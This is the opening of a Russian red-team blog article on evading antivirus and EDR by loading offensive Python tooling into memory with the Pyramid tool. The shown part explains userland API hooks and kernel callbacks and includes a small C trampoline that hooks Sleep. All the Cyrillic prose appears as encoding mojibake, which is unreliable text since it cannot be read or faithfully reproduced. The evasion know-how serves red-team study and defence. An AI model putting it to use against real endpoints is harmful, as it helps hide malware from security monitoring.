---
layout: post
title: "–ó–º–µ–∏–Ω–∞—è –ø–∏—Ä–∞–º–∏–¥–∞. –ó–∞–ø—É—Å–∫–∞–µ–º –º–∞–ª–≤–∞—Ä—å –∏–∑ —Å–ª–µ–ø–æ–π –∑–æ–Ω—ã EDR"
date: 2023-04-05 18:00:00 +0300
author: snovvcrash
tags: [xakep-ru, red-teaming, living-off-the-blindspot, maldev, av-bypass, edr-evasion, python, iron-python, impacket]
---

[//]: # (2022-10-27)

–í —ç—Ç–æ–π —Å—Ç–∞—Ç—å–µ —è –ø–æ–∫–∞–∂—É, –∫–∞–∫ –≤–æ–æ—Ä—É–∂–∏—Ç—å standalone-–∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä Python –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ "–æ–ø–∞—Å–Ω—ã—Ö" –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–µ–π –ø—Ä—è–º–æ –≤ –ø–∞–º—è—Ç—å –ø—Ä–∏ –ø–æ–º–æ—â–∏ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–∞ Pyramid (–Ω–µ –ø—É—Ç–∞—Ç—å —Å –≤–µ–±-—Ñ—Ä–µ–π–º–≤–æ—Ä–∫–æ–º). –ü–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ —ç—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –æ–±–æ–π—Ç–∏ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—É—é –∑–∞—â–∏—Ç—É –ø—Ä–∏ –ø–µ–Ω—Ç–µ—Å—Ç–µ –∏ —Å–∫—Ä—ã—Ç—å –∏—Å—Ç–æ—á–Ω–∏–∫ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–π —Ç–µ–ª–µ–º–µ—Ç—Ä–∏–∏ –æ—Ç EDR –ø—Ä–∏ –æ–ø–µ—Ä–∞—Ü–∏—è—Ö Red Team.

<!--cut-->

<p align="right">
  <a href="https://hackmag.com/security/python-pyramid/"><img src="https://img.shields.io/badge/F-HackMag-26a0c4?style=flat-square" alt="hackmag-badge.svg" /></a>
  <a href="https://xakep.ru/2022/10/27/python-pyramid/"><img src="https://img.shields.io/badge/%5d%5b-%d0%a5%d0%b0%d0%ba%d0%b5%d1%80-red?style=flat-square" alt="xakep-badge.svg" /></a>
</p>

–°–∫–æ–ª—å–∫–æ –µ—Å—Ç—å —Ä–∞–∑–Ω—ã—Ö —Ç–µ—Ö–Ω–∏–∫ –æ–±—Ö–æ–¥–∞ –∞–Ω—Ç–∏–≤–∏—Ä—É—Å–Ω—ã—Ö –º–µ—Ö–∞–Ω–∏–∑–º–æ–≤ –∏ EDR-—Ä–µ—à–µ–Ω–∏–π ‚Äî –∏ –Ω–µ —Å–æ—Å—á–∏—Ç–∞—Ç—å! –û–±—Ñ—É—Å–∫–∞—Ü–∏—è –∏ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏, –¥–∏–Ω–∞–º–∏—á–µ—Å–∫–æ–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è WinAPI, [—Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã](https://xakep.ru/2022/03/31/keethief/), –æ—Ç–ª–æ–∂–µ–Ω–Ω–æ–µ –∏—Å–ø–æ–ª–Ω–µ–Ω–∏–µ, —É–∫–ª–æ–Ω–µ–Ω–∏–µ –æ—Ç —Ö—É–∫–æ–≤ –∑–∞—â–∏—Ç–Ω—ã—Ö –ø—Ä–æ–¥—É–∫—Ç–æ–≤, –ø–æ–¥–ø–∏—Å—å .exe —Å–ø—É—Ñ–∞–Ω–Ω—ã–º–∏ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞–º–∏, [—Ñ–ª—É–∫—Ç—É–∏—Ä—É—é—â–∏–µ –Ω–∞—á–∏–Ω–∫–∏](https://xakep.ru/2022/06/17/shellcode-fluctuation/), –ø–æ–¥–º–µ–Ω–∞ —Å—Ç–µ–∫–∞ –≤—ã–∑–æ–≤–æ–≤... –ö–∞–∂–µ—Ç—Å—è, —ç—Ç–æ—Ç —Å–ø–∏—Å–æ–∫ –º–æ–∂–Ω–æ –ø—Ä–æ–¥–æ–ª–∂–∞—Ç—å –±–µ—Å–∫–æ–Ω–µ—á–Ω–æ.

–ù–æ —á—Ç–æ –µ—Å–ª–∏ –ø—Ä–µ–¥–ø–æ–ª–æ–∂–∏—Ç—å, —á—Ç–æ —Å—É—â–µ—Å—Ç–≤—É—é—Ç —Ç–∞–∫–∏–µ ¬´—Å–ª–µ–ø—ã–µ¬ª –∑–æ–Ω—ã, –æ—Å—Ç–∞–≤–∞—è—Å—å –≤ –ø—Ä–µ–¥–µ–ª–∞—Ö –∫–æ—Ç–æ—Ä—ã—Ö, –º–æ–∂–Ω–æ –±–µ–∑–Ω–∞–∫–∞–∑–∞–Ω–Ω–æ —Ç–≤–æ—Ä–∏—Ç—å –≤—Å–µ, —á—Ç–æ —Ç–µ–±–µ –∑–∞–±–ª–∞–≥–æ—Ä–∞—Å—Å—É–¥–∏—Ç—Å—è (–≤ –ø—Ä–µ–¥–µ–ª–∞—Ö —Ä–∞–∑—É–º–Ω–æ–≥–æ), –∏ –Ω–µ –±–æ—è—Ç—å—Å—è –ø—Ä–∏ —ç—Ç–æ–º —Å–ø–∞–ª–∏—Ç—å –≤–µ—Å—å —Ä–µ–¥—Ç–∏–º–∏–Ω–≥? –ß—Ç–æ –∂, —Ç–∞–∫–∏–µ –∑–æ–Ω—ã –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –µ—Å—Ç—å, –∏ —ç—Ç–æ –Ω–∏–∫–∞–∫–æ–π –Ω–µ Ring0, –∞ –æ–±—ã—á–Ω—ã–π –∏–Ω—Ç–µ—Ä–ø—Ä–µ—Ç–∞—Ç–æ—Ä Python! –ù–∞ –ü–∏—Ç–æ–Ω–µ –Ω–∞–ø–∏—Å–∞–Ω–æ —Ç–∞–∫–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –Ω–∞—Å—Ç—É–ø–∞—Ç–µ–ª—å–Ω—ã—Ö —É—Ç–∏–ª–∏—Ç, –Ω–æ –∑–∞–ø—É—Å–∫–∞—Ç—å –∏—Ö –ø—Ä–∏–Ω—è—Ç–æ –æ–±—ã—á–Ω–æ —Å —É–¥–∞–ª–µ–Ω–Ω–æ–π –º–∞—à–∏–Ω—ã. –ü–æ—á–µ–º—É? –ê—Ö –¥–∞, –∑–∞-–≤–∏-—Å–∏-–º–æ—Å-—Ç–∏...

–°–µ–≥–æ–¥–Ω—è –º—ã —Å —Ç–æ–±–æ–π —Ä–∞–∑–±–µ—Ä–µ–º –ø–æ–¥—Ö–æ–¥ [Living-Off-the-Blindspot](https://www.naksyn.com/edr%20evasion/2022/09/01/operating-into-EDRs-blindspot.html), –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω—ã–π –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª–µ–º –î–∏–µ–≥–æ –ö–∞–ø—Ä–∏–æ—Ç—Ç–∏ ([@naksyn](https://twitter.com/naksyn)) –Ω–∞ –Ω–µ–¥–∞–≤–Ω–µ–º DEF CON 30.

> **WARNING**
>
> –°—Ç–∞—Ç—å—è –∏–º–µ–µ—Ç –æ–∑–Ω–∞–∫–æ–º–∏—Ç–µ–ª—å–Ω—ã–π —Ö–∞—Ä–∞–∫—Ç–µ—Ä –∏ –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω–∞ –¥–ª—è —Å–ø–µ—Ü–∏–∞–ª–∏—Å—Ç–æ–≤ –ø–æ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏, –ø—Ä–æ–≤–æ–¥—è—â–∏—Ö —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤ —Ä–∞–º–∫–∞—Ö –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞. –ê–≤—Ç–æ—Ä –Ω–µ –Ω–µ—Å–µ—Ç –æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ—Å—Ç–∏ –∑–∞ –ª—é–±–æ–π –≤—Ä–µ–¥, –ø—Ä–∏—á–∏–Ω–µ–Ω–Ω—ã–π —Å –ø—Ä–∏–º–µ–Ω–µ–Ω–∏–µ–º –∏–∑–ª–æ–∂–µ–Ω–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏. –†–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º, –Ω–∞—Ä—É—à–µ–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —Å–∏—Å—Ç–µ–º –∏ –Ω–∞—Ä—É—à–µ–Ω–∏–µ —Ç–∞–π–Ω—ã –ø–µ—Ä–µ–ø–∏—Å–∫–∏ –ø—Ä–µ—Å–ª–µ–¥—É—é—Ç—Å—è –ø–æ –∑–∞–∫–æ–Ω—É.

[![banner.jpg](/assets/images/python-pyramid/banner.jpg)](/assets/images/python-pyramid/banner.jpg)
{:.center-image}

* TOC
{:toc}

# –ß—Ç–æ –∫ —á–µ–º—É –∏ –ø–æ—á–µ–º—É

–î–∞–≤–∞–π —Å–ø–µ—Ä–≤–∞ –æ–∫–∏–Ω–µ–º –≤–∑–æ—Ä–æ–º —Ç–µ–æ—Ä–∏—é –∏ –ø–æ–π–º–µ–º, –ø–æ—á–µ–º—É —Ç–≤–æ–π –∞–Ω—Ç–∏–≤–∏—Ä—É—Å (–∏–ª–∏ EDR) –∑–Ω–∞–µ—Ç –æ —Ç–µ–±–µ –≤—Å–µ, –ø–æ—Ç–æ–º –ø–æ–π–º–µ–º –ø—Ä–∏–Ω—Ü–∏–ø –±–µ–∑—Ñ–∞–π–ª–æ–≤–æ–≥–æ –∏–º–ø–æ—Ä—Ç–∞ –º–æ–¥—É–ª–µ–π –≤ Python, –∞ –∑–∞—Ç–µ–º –ø–µ—Ä–µ–π–¥–µ–º –∫ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–∏—é –µ–≥–æ —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ –≤ Pyramid. –î–ª—è –ø–µ—Ä–≤—ã—Ö –¥–≤—É—Ö —á–∞—Å—Ç–µ–π —è –≤–æ—Å–ø–æ–ª—å–∑—É—é—Å—å [—Å–ª–∞–π–¥–∞–º–∏](https://raw.githubusercontent.com/naksyn/talks/main/DEFCON30/Diego%20Capriotti%20-%20DEFCON30%20Adversary%20Village%20-%20%20Python%20vs%20Modern%20Defenses.pdf) –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–æ–≥–æ –≤—ã—Å—Ç—É–ø–ª–µ–Ω–∏—è.

–ü–µ—Ä–≤–æ–µ, –Ω–∞ —á–µ–º —Ö–æ—á–µ—Ç—Å—è –∑–∞–æ—Å—Ç—Ä–∏—Ç—å –≤–Ω–∏–º–∞–Ω–∏–µ, ‚Äî —ç—Ç–æ –¥–≤–µ —Å–∞–º—ã–µ –ª—é–±–∏–º—ã–µ —Ç–µ—Ö–Ω–∏–∫–∏ —Ä–∞–∑—Ä–∞–±–æ—Ç—á–∏–∫–æ–≤ –∑–∞—â–∏—Ç–Ω–æ–≥–æ —Å–æ—Ñ—Ç–∞ –¥–ª—è –∞–Ω–∞–ª–∏–∑–∞ –ø–æ–≤–µ–¥–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º:

1. —Ö—É–∫–∏ Windows API (Win32 –∏–ª–∏ Native) –≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å—Å–∫–æ–º –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ;
2. –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ —á—É–≤—Å—Ç–≤–∏—Ç–µ–ª—å–Ω—ã—Ö —Å–æ–±—ã—Ç–∏—è—Ö –≤ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–µ —è–¥—Ä–∞.

## –•—É–∫–∏ –≤ userland

[![naksyn-usermode-hooks.png](/assets/images/python-pyramid/naksyn-usermode-hooks.png)](/assets/images/python-pyramid/naksyn-usermode-hooks.png)
{:.center-image}

EDR VISIBILITY ‚Äî Usermode Hooks (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äî Python vs Modern Defenses)
{:.quote}

–ß—Ç–æ–±—ã –æ—Ç—Å–ª–µ–∂–∏–≤–∞—Ç—å –∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ –º–µ—Ö–∞–Ω–∏–∑–º–∞–º–∏ Windows API, —Ç–≤–æ–π –∞–Ω—Ç–∏–≤–∏—Ä—É—Å, —Å–∫–æ—Ä–µ–µ –≤—Å–µ–≥–æ, **–ø–∞—Ç—á–∏—Ç –¥–∂–∞–º–ø–∞–º–∏** —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —Ñ—É–Ω–∫—Ü–∏–π –∏–∑ –±–∏–±–ª–∏–æ—Ç–µ–∫ `user32.dll` –∏ `ntdll.dll` –ø–æ—Å–ª–µ –∏—Ö –∑–∞–≥—Ä—É–∑–∫–∏ –≤ –ø–∞–º—è—Ç—å –∞–Ω–∞–ª–∏–∑–∏—Ä—É–µ–º—ã–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º. –ü–æ—Å–ª–µ –≤—ã–∑–æ–≤–∞ —Ç–∞–∫–∏—Ö, –∫–∞–∑–∞–ª–æ—Å—å –±—ã, –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π WinAPI, –Ω–∏—á–µ–≥–æ –Ω–µ –ø–æ–¥–æ–∑—Ä–µ–≤–∞—é—â–∏–π –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä –Ω–∞—Ç–∞–ª–∫–∏–≤–∞–µ—Ç—Å—è –Ω–∞ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–π –¥–∂–∞–º–ø, —É–∫–∞–∑—ã–≤–∞—é—â–∏–π –Ω–∞ –æ–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏ —É–∂–µ –ø–æ–¥–≥—Ä—É–∂–µ–Ω–Ω–æ–π –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ —Å—Ä–µ–¥—Å—Ç–≤–∞ –∑–∞—â–∏—Ç—ã, –∏ —Å–ª–µ–¥—É–µ—Ç –ø–æ –Ω–µ–º—É, –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —á–µ–≥–æ –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ –ø–æ—Ç–æ–∫–æ–º –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø—Ä–æ–≥—Ä–∞–º–º—ã –ø–µ—Ä–µ–¥–∞–µ—Ç—Å—è –∞–Ω—Ç–∏–≤–∏—Ä—É—Å—É.

–¢–µ–ø–µ—Ä—å ¬´–≤–∏—Ä—É—Å–æ–Ω–µ–Ω–∞–≤–∏—Å—Ç–Ω–∏–∫¬ª –º–æ–∂–µ—Ç –∫–∞–∫ —É–≥–æ–¥–Ω–æ –∏–∑–º—ã–≤–∞—Ç—å—Å—è –Ω–∞–¥ —Ç–≤–æ–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º, –∏—Å—Å–ª–µ–¥—É—è –µ–≥–æ –≤–∏—Ä—Ç—É–∞–ª—å–Ω—É—é –ø–∞–º—è—Ç—å –∏ –ø—Ä–æ–≤–æ–¥—è –¥—Ä—É–≥–∏–µ –æ–¥–Ω–æ–º—É –ë–æ–≥—É –∏–∑–≤–µ—Å—Ç–Ω—ã–µ –ø—Ä–æ–≤–µ—Ä–∫–∏, –ø–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞–º –∫–æ—Ç–æ—Ä—ã—Ö –±—É–¥–µ—Ç –≤—ã–Ω–µ—Å–µ–Ω –≤–µ—Ä–¥–∏–∫—Ç ‚Äî ¬´–≤–∏–Ω–æ–≤–µ–Ω¬ª (–∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ API-—Ñ—É–Ω–∫—Ü–∏–∏ –∏–ª–∏, –º–æ–∂–µ—Ç, –≤–æ–æ–±—â–µ —É–±–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å) –∏–ª–∏ ¬´–æ–ø—Ä–∞–≤–¥–∞–Ω¬ª (¬´–æ—Ç–ø—É—Å—Ç–∏—Ç—å¬ª –ø–æ—Ç–æ–∫ –≤—ã–ø–æ–ª–µ–Ω–∏—è –∏—Å—Ö–æ–¥–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º–µ).

–ß—Ç–æ-—Ç–æ –ø–æ—Ö–æ–∂–µ–µ –º—ã –ø—Ä–æ–≤–æ—Ä–∞—á–∏–≤–∞–ª–∏, –∫–æ–≥–¥–∞ —ç–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç–∏—Ä–æ–≤–∞–ª–∏ —Å —Ç–µ—Ö–Ω–∏–∫–æ–π [—Ñ–ª—É–∫—Ç—É–∏—Ä—É—é—â–µ–≥–æ —à–µ–ª–ª-–∫–æ–¥–∞](https://xakep.ru/2022/06/17/shellcode-fluctuation/). –¢–æ–≥–¥–∞ –Ω–∞—à –¥–∂–∞–º–ø (–ø–∞—Ç—á –¥–ª—è –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞ –∫–æ–Ω—Ç—Ä–æ–ª—è –Ω–∞–¥ —Ñ—É–Ω–∫—Ü–∏–µ–π `kernel32!Sleep`) –≤—ã–≥–ª—è–¥–µ–ª –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫:

```c
/*

{ 0x49, 0xBA, 0x37, 0x13, 0xD3, 0xC0, 0x4D, 0xD3, 0x37, 0x13, 0x41, 0xFF, 0xE2 }

Disassembly:

0:  49 ba 37 13 d3 c0 4d    movabs r10,0x1337d34dc0d31337
7:  d3 37 13
a:  41 ff e2                jmp    r10

*/

uint8_t trampoline[] = {
    0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, addr
    0x41, 0xFF, 0xE2                                            // jmp r10
};
```

–Ø —É–∂–µ –ø—Ä–∏–≤–æ–¥–∏–ª —Ä–∞–Ω–µ–µ —ç—Ç—É —Å—Ç–∞—Ç—å—é [@ShitSecure](https://twitter.com/ShitSecure), –≤ –∫–æ—Ç–æ—Ä–æ–π –¥–æ—Å—Ç—É–ø–Ω—ã–º —è–∑—ã–∫–æ–º —Ä–∞–∑–æ–±—Ä–∞–Ω—ã –ø–æ–ø—É–ª—è—Ä–Ω—ã–µ –ø—Ä–∏–µ–º—ã, –ø—Ä–∏–º–µ–Ω—è–µ–º—ã–µ —Å—Ä–µ–¥—Å—Ç–≤–∞–º–∏ –∑–∞—â–∏—Ç—ã, –∏ —Å–ø–æ—Å–æ–±—ã –∏—Ö –æ–±—Ö–æ–¥–∞. –ü–æ–≤—Ç–æ—Ä–µ–Ω–∏–µ ‚Äî –º–∞—Ç—å —É—á–µ–Ω–∏—è, –∏ –∫ —Ç–æ–º—É –∂–µ —Ç–∞–º —Ç–æ–∂–µ –µ—Å—Ç—å –ø—Ä–æ —Ö—É–∫–∏ –≤ userland:

- [A tale of EDR bypass methods](https://s3cur3th1ssh1t.github.io/A-tale-of-EDR-bypass-methods/)

[![shitsecure-userland-hooking.png](/assets/images/python-pyramid/shitsecure-userland-hooking.png)](/assets/images/python-pyramid/shitsecure-userland-hooking.png)
{:.center-image}

McAfee –±—É–¥–µ—Ç —Ö—É–∫–∞—Ç—å, —Ö—É–∫–∞—Ç—å –±—É–¥–µ—Ç McAfee
{:.quote}

## –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ–±—Ä–∞—Ç–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ —è–¥—Ä–µ

[![naksyn-kernel-callbacks.png](/assets/images/python-pyramid/naksyn-kernel-callbacks.png)](/assets/images/python-pyramid/naksyn-kernel-callbacks.png)
{:.center-image}

EDR VISIBILITY ‚Äî Kernel Callbacks (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äî Python vs Modern Defenses)
{:.quote}

–ö—É–¥–∞ –±–æ–ª–µ–µ –º–æ—â–Ω—ã–π –º–µ—Ö–∞–Ω–∏–∑–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∫–æ–Ω—Ç—Ä–æ–ª—è –Ω–∞–¥ –ø–æ–≤–µ–¥–µ–Ω–∏–µ–º –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ —Ä–µ–∞–ª–∏–∑—É–µ—Ç—Å—è —á–µ—Ä–µ–∑ —è–¥–µ—Ä–Ω—ã–π –º–µ—Ö–∞–Ω–∏–∑–º **Notification Callback Routines**. –û–Ω –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å—ã –¥–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ —Ñ—É–Ω–∫—Ü–∏–π –ø–æ–¥–ø–∏—Å–∫–∏ –Ω–∞ –ø–æ—Ç–µ–Ω—Ü–∏–∞–ª—å–Ω–æ –æ–ø–∞—Å–Ω—ã–µ —Å–æ–±—ã—Ç–∏—è, –Ω–∞–ø—Ä–∏–º–µ—Ä, –≤—ã–∑–æ–≤ `ntdll!NtCreateProcess`. –ö–æ–≥–¥–∞ –ø–æ–ª—É—á–µ–Ω–æ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Å–æ–∑–¥–∞–Ω–∏–∏ –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞, EDR –±–µ–∂–∏—Ç –≤–Ω–µ–¥—Ä—è—Ç—å —Å–≤–æ–∏ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ü–µ–ª–µ–≤–æ–π –ø—Ä–æ—Ü–µ—Å—Å, —á—Ç–æ–±—ã –≤ —Ç–æ–º —á–∏—Å–ª–µ –∏–º–µ—Ç—å –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–∞—Ç—á–∏—Ç—å —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ Windows API, –∫–∞–∫ –æ–ø–∏—Å–∞–Ω–æ –≤ –ø—Ä–µ–¥—ã–¥—É—â–µ–º —Ä–∞–∑–¥–µ–ª–µ.

–î—Ä—É–≥–æ–π –ø–æ–∫–∞–∑–∞—Ç–µ–ª—å–Ω—ã–π –ø—Ä–∏–º–µ—Ä —Ç–æ–≥–æ, –∑–∞—á–µ–º –Ω—É–∂–Ω—ã Kernel Callbacks, ‚Äî —Ç–∞–π–º–ª–∞–π–Ω –∑–∞–ø—Ä–µ—Ç–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ –ø–∞–º—è—Ç–∏ –ø—Ä–æ—Ü–µ—Å—Å–∞ `lsass.exe`, –æ–ø–∏—Å–∞–Ω–Ω—ã–π –≤ –¥—Ä—É–≥–æ–º –∫—Ä—É—Ç–æ–º —Ä–µ—Å–µ—Ä—á–µ —Å DEF CON 30 ‚Äî [EDR detection mechanisms and bypass techniques with EDRSandBlast](https://raw.githubusercontent.com/wavestone-cdt/EDRSandblast/DefCon30Release/DEFCON30-DemoLabs-EDR_detection_mechanisms_and_bypass_techniques_with_EDRSandblast-v1.0.pdf) –∞–≤—Ç–æ—Ä–æ–≤ [@th3m4ks](https://twitter.com/th3m4ks) –∏ [@_Qazeer](https://twitter.com/_Qazeer).

[![th3m4ks-kernel-callbacks.png](/assets/images/python-pyramid/th3m4ks-kernel-callbacks.png)](/assets/images/python-pyramid/th3m4ks-kernel-callbacks.png)
{:.center-image}

How come the EDR knows everything? (–∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ ‚Äî EDR detection mechanisms and bypass techniques with EDRSandBlast)
{:.quote}

–¢–∞–∫, –ø–æ–ª—É—á–∞—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ –Ω–µ–∂–µ–ª–∞—Ç–µ–ª—å–Ω—ã—Ö —Å–æ–±—ã—Ç–∏—è—Ö –Ω–∞ –∫–∞–∂–¥–æ–º –∏–∑ —ç—Ç–∞–ø–æ–≤ [–¥–∞–º–ø–∞ LSASS](https://habr.com/ru/company/angarasecurity/blog/661341/) (—Å–æ–∑–¥–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞ –¥–∞–º–ø–µ—Ä–∞, –ø–æ–ª—É—á–µ–Ω–∏–µ –∏–º —Ö–µ–Ω–¥–ª–∞ `lsass.exe`, —á—Ç–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏ `lsass.exe`, —Å–æ–∑–¥–∞–Ω–∏–µ —Ñ–∞–π–ª–∞ —Å —Ä–µ–∑—É–ª—å—Ç–∏—Ä—É—é—â–∏–º —Å–ª–µ–ø–∫–æ–º –ø–∞–º—è—Ç–∏), –∞–Ω—Ç–∏–≤–∏—Ä—É—Å –∏–ª–∏ EDR –º–æ–∂–µ—Ç –≤—ã—Å—Ç—Ä–æ–∏—Ç—å –º–Ω–æ–≥–æ—É—Ä–æ–≤–Ω–µ–≤—É—é [–∑–∞—â–∏—Ç—É](https://habr.com/ru/company/angarasecurity/blog/679592/) –æ—Ç –ø–æ–ª—É—á–µ–Ω–∏—è –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–æ–º —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö –∏–∑ –ø–∞–º—è—Ç–∏ —Å–µ—Ç–µ–≤–æ–≥–æ —É–∑–ª–∞.

–°—É—â–µ—Å—Ç–≤—É–µ—Ç –∫—É—á–∞ –¥—Ä—É–≥–∏—Ö –ø–æ–¥—Ö–æ–¥–æ–≤ –¥–ª—è –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—â–µ–Ω–∏—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏ –Ω–∞ –∫–æ–Ω–µ—á–Ω—ã—Ö —Ç–æ—á–∫–∞—Ö, –∫–∞–∫, –Ω–∞–ø—Ä–∏–º–µ—Ä, —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–∞–º—è—Ç–∏ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –ø–æ –ø–ª–∞–Ω–∏—Ä–æ–≤—â–∏–∫—É, –Ω–æ –¥–ª—è –±–∞–∑–æ–≤–æ–≥–æ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–∏—è –Ω–∞—à–µ–π —Ç–µ–º—ã —ç—Ç–æ–≥–æ –±—É–¥–µ—Ç –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ.

## –°–ª–µ–ø—ã–µ –∑–æ–Ω—ã EDR

[![attackers-pyramid-of-pain.png](/assets/images/python-pyramid/attackers-pyramid-of-pain.png)](/assets/images/python-pyramid/attackers-pyramid-of-pain.png)
{:.center-image}

–ü–∏—Ä–∞–º–∏–¥–∞ –±–æ–ª–∏ —Ä–µ–¥—Ç–∏–º–µ—Ä–∞
{:.quote}

–í –∏—Å—Ö–æ–¥–Ω–æ–π —Å—Ç–∞—Ç—å–µ –∞–≤—Ç–æ—Ä —Ä–∞–∑–¥–µ–ª—è–µ—Ç —Å—Ç—Ä–∞—Ç–µ–≥–∏–∏ –±–∞–π–ø–∞—Å–∞ EDR –Ω–∞ —á–µ—Ç—ã—Ä–µ –æ—Å–Ω–æ–≤–Ω—ã–µ –æ–±–ª–∞—Å—Ç–∏. –ú—ã —Å–æ–∫—Ä–∞—Ç–∏–º –∏—Ö –¥–æ —Ç—Ä–µ—Ö:

